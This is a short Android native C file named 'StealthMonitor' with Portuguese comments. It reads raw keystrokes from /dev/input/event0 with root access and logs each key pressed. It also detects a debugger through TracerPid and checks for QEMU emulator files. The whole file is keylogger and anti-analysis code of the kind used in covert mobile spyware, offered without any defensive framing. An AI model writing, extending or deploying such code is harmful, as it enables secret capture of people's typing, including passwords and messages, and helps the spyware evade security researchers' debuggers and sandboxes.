#include <jni.h>
#include <android/log.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>

#define TAG "StealthMonitor"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, TAG, __VA_ARGS__)

// Hook para /dev/input/eventX (requer root)
int hook_input_events() {
    int fd = open("/dev/input/event0", O_RDONLY);
    if (fd < 0) {
        LOGD("Failed to open input device");
        return -1;
    }
    
    struct input_event ev;
    while (read(fd, &ev, sizeof(ev)) > 0) {
        if (ev.type == EV_KEY && ev.value == 1) {
            LOGD("Key pressed: %d", ev.code);
            // Process keypress
        }
    }
    
    close(fd);
    return 0;
}

// Anti-debugging nativo
int is_debugger_present() {
    FILE* status = fopen("/proc/self/status", "r");
    if (!status) return 0;
    
    char line[256];
    while (fgets(line, sizeof(line), status)) {
        if (strstr(line, "TracerPid:")) {
            int tracer_pid = atoi(line + 10);
            fclose(status);
            return tracer_pid != 0;
        }
    }
    fclose(status);
    return 0;
}

// Verificar se é emulador
int is_emulator() {
    // Verificar arquivos típicos de emulador
    if (access("/system/lib/libc_malloc_debug_qemu.so", F_OK) == 0) return 1;
    if (access("/sys/qemu_trace", F_OK) == 0) return 1;
    if (access("/system/bin/qemu-props", F_OK) == 0) return 1;
    
    return 0;
}